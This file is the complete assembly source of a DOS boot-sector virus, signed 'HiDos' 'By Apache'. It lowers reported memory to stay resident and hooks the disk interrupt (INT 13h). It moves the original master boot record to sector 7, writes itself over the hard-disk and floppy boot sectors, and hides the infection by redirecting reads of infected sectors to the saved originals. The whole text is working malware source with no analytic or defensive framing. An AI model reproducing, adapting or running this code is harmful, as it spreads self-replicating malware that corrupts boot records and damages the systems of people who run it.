        NAME boot         
        PAGE 55,132
        TITLE FILE UTIL




code segment

        ASSUME CS:CODE,DS:CODE,ES:CODE

        org 100h  

main:           jmp over
                db '['
id              db 'HiDos]',0 
by              db 'By Apache',0
over:           xor ax,ax
                mov ds,ax
                cli
                mov ss,ax           
                mov sp,7c00h
                sti
                mov ax,ds:[004eh]
                mov word ptr ds:[int13+7b02h],ax
                mov ax,ds:[004ch]
                mov word ptr ds:[int13+7b00h],ax
                mov ax,ds:[0413h]
                dec ax
                dec ax
                mov ds:[0413h],ax  
                mov cl,06h   
                shl ax,cl   
                mov es,ax
                mov word ptr ds:[bigj+7b02h],es
                mov ax,offset jumpt 
                mov word ptr ds:[bigj+7b00h],ax 
                mov cx,0400h
                push cs 
                pop ds     
                mov si,7c00h   
                mov di,0100h
                cld    
                repz
                movsb
                push cs 
                pop ds 
                jmp cs:[bigj+7b00h] 

jumpt:          push cs
                pop ds
                mov si,offset drive
                cmp byte ptr ds:[si],80h 
                jz hdone  
                mov bx,0300h
                mov cx,0001h
                mov dx,0080h
                push cs
                pop es
                call hdread
                cmp ds:[0304h],'iH'
                jz hdone
                mov bx,0300h
                mov cx,0007h
                mov dx,0080h
                call hdwrit
                mov si,04beh
                mov di,02beh
                mov cx,0042h
                cld
                repz
                movsb
                mov byte ptr ds:[drive],80h
                mov bx,0100h
                mov cx,0001h
                mov dx,0080h
                call hdwrit
                mov byte ptr ds:[drive],00h

hdone:          xor ax,ax     
                mov word ptr cs:[boot+2],ax
                mov es,ax
                push cs
                pop ds
                mov ax,0201h
                mov bx,7c00h
                mov word ptr ds:[boot],bx
                mov si,offset drive
                cmp byte ptr ds:[si],80h
                jz hload 
                mov cx,0003h
                mov dx,0100h
                jmp fload 
hload:          mov cx,0007h 
                mov dx,0080h
fload:          mov di,'rv'
                int 13h
                mov si,offset drive
                mov byte ptr cs:[si],00h
                xor ax,ax
                mov es,ax
                mov ds,ax
                mov ax,offset nint13
                mov ds:[004ch],ax
                mov ds:[004eh],cs
                push cs
                pop ds
                jmp cs:[boot]

hdwrit:         mov ax,0301h
                mov di,'rv'  
                jmp xx4
hdread:         mov ax,0201h
                mov di,'rv'  
xx4:            int 13h
                ret 

nint13:         cmp di,'rv'   
                jz iv13
                cmp ah,02h
                jnz wcheck
                cmp cl,01h
                jnz wcheck
                cmp dh,00h 
                jnz wcheck 
                cmp dl,80h
                jz check1
                cmp dl,00h
                jnz wcheck
check1:         push ax 
                push bx 
                push cx 
                push dx 
                push ds
                push es 
                push di
                mov bx,0300h
                push cs
                pop es
                call hdread
                mov si,offset [id+0200h]
                cmp es:[si],'iH'
                jz redirect
                jmp iflopd
redirect:       cmp dl,80h
                jnz rdirfl 
                pop di 
                pop es 
                pop ds
                pop dx 
                pop cx 
                pop bx 
                pop ax 
                mov cx,0007h 
                jmp a13  
          
rdirfl:         pop di 
                pop es 
                pop ds
                pop dx 
                pop cx 
                pop bx 
                pop ax 
                mov cx,0003h 
                mov dx,0100h
a13:            mov ax,0201h
iv13:           jmp v13 


wcheck:         cmp ah,03h
                jnz v13
                cmp dl,00h
                jnz v13
                push ax
                push bx
                push cx
                push dx
                push ds
                push es
                push di
                push cs
                pop es 
                mov bx,0300h
                mov cx,0001h
                xor dx,dx
                call hdread
                mov si,offset [id+0200h] 
                cmp es:[si],'iH' 
                jz iflopd 
                mov cx,0003h 
                mov dx,0100h 
                mov bx,0300h 
                call hdwrit
                mov bx,0100h 
                xor dx,dx
                mov cx,0001h
                call hdwrit
iflopd:         pop di 
                pop es 
                pop ds 
                pop dx 
                pop cx 
                pop bx 
                pop ax 
v13:            db 0eah
int13           dd 0h   
drive           db 0h  
bigj            dd 0h
boot            dd 0h   

code ends

end main